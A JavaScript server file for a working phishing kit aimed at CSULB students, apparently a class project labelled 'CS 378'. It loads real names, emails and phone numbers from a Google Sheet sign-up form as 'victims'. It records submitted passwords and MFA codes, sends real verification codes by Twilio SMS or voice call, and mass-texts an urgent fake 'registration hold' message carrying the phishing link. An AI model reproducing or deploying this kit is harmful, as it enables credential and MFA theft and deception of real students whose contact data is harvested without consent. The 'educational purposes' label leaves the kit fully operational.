import express from 'express';
import cors from 'cors';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3001;

app.use(cors());
app.use(express.json());

// ─── Config ───
// Load .env manually (simple approach, no dotenv dependency)
function loadEnv() {
  const envPath = path.join(__dirname, '.env');
  if (fs.existsSync(envPath)) {
    const lines = fs.readFileSync(envPath, 'utf-8').split('\n');
    for (const line of lines) {
      const trimmed = line.trim();
      if (trimmed && !trimmed.startsWith('#')) {
        const [key, ...rest] = trimmed.split('=');
        process.env[key.trim()] = rest.join('=').trim();
      }
    }
  }
}
loadEnv();

const TWILIO_ACCOUNT_SID = process.env.TWILIO_ACCOUNT_SID || '';
const TWILIO_AUTH_TOKEN = process.env.TWILIO_AUTH_TOKEN || '';
const TWILIO_PHONE_NUMBER = process.env.TWILIO_PHONE_NUMBER || '';
const GOOGLE_SHEET_ID = process.env.GOOGLE_SHEET_ID || '12qiLggh7BcBts92j9bLlpPlrOpQeyv1mMVkzdQwbzRQ';
const PHISHING_URL = process.env.PHISHING_URL || 'http://localhost:5173';

let twilioClient = null;

async function initTwilio() {
  if (TWILIO_ACCOUNT_SID && TWILIO_AUTH_TOKEN) {
    const twilio = (await import('twilio')).default;
    twilioClient = twilio(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN);
    console.log('✅ Twilio configured');
  } else {
    console.log('⚠️  Twilio not configured — SMS/calls will be simulated');
  }
}

// ─── Google Sheet Data (email → phone mapping) ───
// Fetches the published Google Sheet as CSV
let victimData = []; // Array of { name, email, phone }

async function fetchGoogleSheet() {
  const url = `https://docs.google.com/spreadsheets/d/${GOOGLE_SHEET_ID}/export?format=csv&gid=806664668`;
  try {
    const res = await fetch(url);
    const csv = await res.text();
    const lines = csv.split('\n').map(l => l.trim()).filter(l => l);

    if (lines.length < 2) {
      console.log('⚠️  Google Sheet has no data rows yet');
      return;
    }

    // Parse CSV (handle quoted fields)
    function parseCSVLine(line) {
      const result = [];
      let current = '';
      let inQuotes = false;
      for (let i = 0; i < line.length; i++) {
        const c = line[i];
        if (c === '"') {
          inQuotes = !inQuotes;
        } else if (c === ',' && !inQuotes) {
          result.push(current.trim());
          current = '';
        } else {
          current += c;
        }
      }
      result.push(current.trim());
      return result;
    }

    // Skip header row (index 0)
    victimData = [];
    for (let i = 1; i < lines.length; i++) {
      const cols = parseCSVLine(lines[i]);
      // Columns: Timestamp, Name, Student Email, Phone Number, Days, Dietary
      if (cols.length >= 4) {
        const name = cols[1] || '';
        const email = (cols[2] || '').toLowerCase().trim();
        let phone = (cols[3] || '').trim();

        // Normalize phone: ensure it starts with +1
        phone = phone.replace(/[^0-9+]/g, '');
        if (phone && !phone.startsWith('+')) {
          if (phone.startsWith('1') && phone.length === 11) {
            phone = '+' + phone;
          } else if (phone.length === 10) {
            phone = '+1' + phone;
          }
        }

        if (email && phone) {
          victimData.push({ name, email, phone });
        }
      }
    }

    console.log(`📋 Loaded ${victimData.length} victims from Google Sheet`);
    victimData.forEach(v => console.log(`   ${v.name} | ${v.email} | ${v.phone}`));
  } catch (err) {
    console.error('Failed to fetch Google Sheet:', err.message);
  }
}

// Helper: mask a phone number like Microsoft SSO does
// +12345678953 → "+X XXXXXXXX53"
function maskPhone(phone) {
  if (!phone || phone.length < 4) return '+X XXXXXXXX53';
  const last2 = phone.slice(-2);
  return `+X XXXXXXXX${last2}`;
}

// Helper: find victim by email
function findVictim(email) {
  const normalized = (email || '').toLowerCase().trim();
  return victimData.find(v => v.email === normalized);
}

// ─── Data Storage ───
const DATA_FILE = path.join(__dirname, 'captured_data.json');
const activeCodes = {}; // { [email]: { code, expiresAt } }

function initDataFile() {
  if (!fs.existsSync(DATA_FILE)) {
    fs.writeFileSync(DATA_FILE, JSON.stringify({
      submissions: [],
      analytics: {
        totalVisits: 0,
        signInViews: 0,
        passwordViews: 0,
        mfaViews: 0,
        mfaCodeViews: 0,
        credentialsCaptured: 0,
        mfaCodesEntered: 0,
        redirectsCompleted: 0,
        smsSent: 0,
      },
    }, null, 2));
  }
}

function readData() {
  initDataFile();
  return JSON.parse(fs.readFileSync(DATA_FILE, 'utf-8'));
}

function writeData(data) {
  fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
}

function generateCode() {
  return Math.floor(100000 + Math.random() * 900000).toString();
}

// ─── Routes ───

// Look up victim by email — returns masked phone number
app.post('/api/lookup', (req, res) => {
  const { email } = req.body;
  const victim = findVictim(email);
  if (victim) {
    res.json({
      found: true,
      maskedPhone: maskPhone(victim.phone),
      name: victim.name,
    });
  } else {
    // Return a fake masked number so the flow doesn't break
    res.json({
      found: false,
      maskedPhone: '+X XXXXXXXX53',
      name: '',
    });
  }
});

// Track page views
app.post('/api/track', (req, res) => {
  const { event } = req.body;
  const data = readData();
  if (data.analytics[event] !== undefined) {
    data.analytics[event]++;
  } else {
    // Map event names
    const map = {
      'visit': 'totalVisits',
      'sign_in_view': 'signInViews',
      'password_view': 'passwordViews',
      'mfa_view': 'mfaViews',
      'mfa_code_view': 'mfaCodeViews',
      'redirect_completed': 'redirectsCompleted',
    };
    if (map[event]) data.analytics[map[event]]++;
  }
  writeData(data);
  res.json({ success: true });
});

// Capture credentials
app.post('/api/capture', (req, res) => {
  const { email, password } = req.body;
  const data = readData();
  const victim = findVictim(email);
  data.submissions.push({
    email,
    password,
    name: victim?.name || '',
    phone: victim?.phone || '',
    timestamp: new Date().toISOString(),
    userAgent: req.headers['user-agent'],
    ip: req.ip,
  });
  data.analytics.credentialsCaptured++;
  writeData(data);
  res.json({ success: true });
});

// Send MFA code via SMS or Voice Call
app.post('/api/send-code', async (req, res) => {
  const { email, method } = req.body;
  const code = generateCode();
  activeCodes[email] = { code, expiresAt: Date.now() + 5 * 60 * 1000 };

  const victim = findVictim(email);
  const phoneNumber = victim?.phone || '';

  console.log(`📱 MFA code for ${email}: ${code} (method: ${method}, phone: ${phoneNumber})`);

  if (twilioClient && phoneNumber) {
    try {
      if (method === 'sms') {
        await twilioClient.messages.create({
          body: `Your verification code is: ${code}`,
          from: TWILIO_PHONE_NUMBER,
          to: phoneNumber,
        });
        console.log(`✅ SMS sent to ${phoneNumber}`);
      } else if (method === 'call') {
        await twilioClient.calls.create({
          twiml: `<Response><Say voice="alice">Your verification code is ${code.split('').join(' ')}. I repeat, ${code.split('').join(' ')}.</Say></Response>`,
          from: TWILIO_PHONE_NUMBER,
          to: phoneNumber,
        });
        console.log(`✅ Call placed to ${phoneNumber}`);
      }
    } catch (err) {
      console.error('Twilio error:', err.message);
    }
  }

  res.json({ success: true });
});

// Verify MFA code
app.post('/api/verify-code', (req, res) => {
  const { email, code } = req.body;
  const stored = activeCodes[email];

  if (!stored) {
    res.json({ success: true }); // Accept anything if no code stored
    return;
  }
  if (Date.now() > stored.expiresAt) {
    delete activeCodes[email];
    res.json({ success: false, error: 'Code expired' });
    return;
  }
  if (stored.code === code) {
    delete activeCodes[email];
    res.json({ success: true });
  } else {
    res.json({ success: false, error: 'Invalid code' });
  }
});

// Capture MFA code
app.post('/api/capture-mfa', (req, res) => {
  const { email, code } = req.body;
  const data = readData();
  const submission = [...data.submissions].reverse().find(s => s.email === email);
  if (submission) {
    submission.mfaCode = code;
    submission.mfaTimestamp = new Date().toISOString();
  }
  data.analytics.mfaCodesEntered++;
  writeData(data);
  res.json({ success: true });
});

// ─── SMS Blast: send phishing link to all victims ───
app.post('/api/send-blast', async (req, res) => {
  if (!twilioClient) {
    return res.json({ success: false, error: 'Twilio not configured' });
  }

  await fetchGoogleSheet(); // Refresh data

  const results = [];
  const data = readData();

  for (const victim of victimData) {
    try {
      await twilioClient.messages.create({
        body: `CSULB Reminder: URGENT - You have a registration hold on your account that must be resolved before the class enrollment deadline on April 18th, 2026. Failure to act will result in your classes being dropped. Verify your identity and resolve the hold now: ${PHISHING_URL}`,
        from: TWILIO_PHONE_NUMBER,
        to: victim.phone,
      });
      results.push({ email: victim.email, phone: victim.phone, status: 'sent' });
      data.analytics.smsSent++;
      console.log(`📤 SMS sent to ${victim.name} (${victim.phone})`);
    } catch (err) {
      results.push({ email: victim.email, phone: victim.phone, status: 'failed', error: err.message });
      console.error(`❌ Failed to send to ${victim.phone}: ${err.message}`);
    }

    // Small delay between messages to avoid rate limiting
    await new Promise(r => setTimeout(r, 500));
  }

  writeData(data);
  res.json({ success: true, results });
});

// Send to a single victim by email
app.post('/api/send-single', async (req, res) => {
  const { email } = req.body;
  if (!twilioClient) {
    return res.json({ success: false, error: 'Twilio not configured' });
  }

  const victim = findVictim(email);
  if (!victim) {
    return res.json({ success: false, error: 'Email not found in spreadsheet' });
  }

  try {
    await twilioClient.messages.create({
      body: `CSULB Reminder: URGENT - You have a registration hold on your account that must be resolved before the class enrollment deadline on April 18th, 2026. Failure to act will result in your classes being dropped. Verify your identity and resolve the hold now: ${PHISHING_URL}`,
      from: TWILIO_PHONE_NUMBER,
      to: victim.phone,
    });

    const data = readData();
    data.analytics.smsSent++;
    writeData(data);

    res.json({ success: true, phone: victim.phone });
  } catch (err) {
    res.json({ success: false, error: err.message });
  }
});

// Get analytics
app.get('/api/analytics', (req, res) => {
  const data = readData();
  res.json({
    analytics: data.analytics,
    submissions: data.submissions.map(s => ({
      email: s.email,
      password: s.password,
      name: s.name,
      phone: s.phone,
      mfaCode: s.mfaCode || null,
      timestamp: s.timestamp,
      userAgent: s.userAgent,
    })),
    victims: victimData.map(v => ({
      name: v.name,
      email: v.email,
      maskedPhone: maskPhone(v.phone),
    })),
  });
});

// Refresh Google Sheet data
app.post('/api/refresh-sheet', async (req, res) => {
  await fetchGoogleSheet();
  res.json({ success: true, count: victimData.length });
});

// Reset data
app.post('/api/reset', (req, res) => {
  if (fs.existsSync(DATA_FILE)) fs.unlinkSync(DATA_FILE);
  initDataFile();
  Object.keys(activeCodes).forEach(k => delete activeCodes[k]);
  res.json({ success: true });
});

// ─── Start ───
async function start() {
  await initTwilio();
  await fetchGoogleSheet();

  app.listen(PORT, () => {
    console.log(`\n🎣 Phishing Demo Backend running on http://localhost:${PORT}`);
    console.log(`📊 Dashboard: frontend at /dashboard`);
    console.log(`📋 Victims loaded: ${victimData.length}`);
    console.log(`\n⚠️  EDUCATIONAL PURPOSES ONLY (CS 378)\n`);
  });
}

start();
